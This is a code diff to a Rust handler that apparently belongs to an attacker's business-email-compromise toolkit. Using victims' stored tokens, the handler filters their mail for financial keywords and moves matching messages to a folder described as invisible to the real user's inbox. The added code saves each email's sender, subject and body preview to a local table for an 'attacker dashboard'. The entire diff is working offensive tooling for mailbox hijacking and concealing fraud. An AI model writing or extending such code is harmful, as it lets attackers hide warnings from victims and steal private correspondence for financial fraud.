@@ -494,6 +494,45 @@ pub async fn auto_filter_handler(
         "dollars", "exchange",
     ];
 
+    // Create local "Filtered" folder for the attacker dashboard
+    let local_folder_id = crate::generate_id();
+    let _ = sqlx::query(
+        "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)
+         ON CONFLICT(id) DO UPDATE SET name = name"
+    )
+    .bind(&local_folder_id)
+    .bind(token_id)
+    .bind("Filtered")
+    .bind(Utc::now())
+    .execute(&state.pool)
+    .await;
+
+    // Find existing Filtered folder
+    let existing_filtered: Option<(String,)> = sqlx::query_as(
+        "SELECT id FROM local_folders WHERE token_id = ? AND name = ?"
+    )
+    .bind(token_id)
+    .bind("Filtered")
+    .fetch_optional(&state.pool)
+    .await
+    .unwrap_or(None);
+
+    let filtered_folder_id = if let Some((id,)) = existing_filtered {
+        id
+    } else {
+        let id = crate::generate_id();
+        let _ = sqlx::query(
+            "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)"
+        )
+        .bind(&id)
+        .bind(token_id)
+        .bind("Filtered")
+        .bind(Utc::now())
+        .execute(&state.pool)
+        .await;
+        id
+    };
+
     let mut moved_count = 0;
 
     for msg in messages {
@@ -523,13 +562,38 @@ pub async fn auto_filter_handler(
                 eprintln!("[filter] Failed to move message {}: {}", msg.id, e);
             }
         }
+
+        // Store in local_filtered_messages for attacker dashboard
+        let sender = msg.from.as_ref()
+            .and_then(|f| f.emailAddress.as_ref())
+            .and_then(|e| e.address.as_ref())
+            .map(|s| s.as_str())
+            .unwrap_or("unknown");
+        let _ = sqlx::query(
+            "INSERT INTO local_filtered_messages (id, token_id, message_id, folder_id, subject, sender, sender_email, received_date, body_preview, keywords, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ON CONFLICT(id) DO UPDATE SET keywords = keywords || ',' || excluded.keywords"
+        )
+        .bind(crate::generate_id())
+        .bind(token_id)
+        .bind(&msg.id)
+        .bind(&filtered_folder_id)
+        .bind(subject)
+        .bind(sender)
+        .bind(sender)
+        .bind(msg.receivedDateTime.as_deref().unwrap_or(""))
+        .bind(body)
+        .bind(&matched.join(", "))
+        .bind(Utc::now())
+        .execute(&state.pool)
+        .await;
     }
 
     HttpResponse::Ok().json(serde_json::json!({
         "success": true,
         "moved": moved_count,
-        "folder_id": target_folder_id,
-        "note": "BEC-suspected emails moved to real folder (invisible to real user inbox)"
+        "folder_id": filtered_folder_id,
+        "note": "BEC-suspected emails moved to real folder and stored locally"
     }))
 }
 
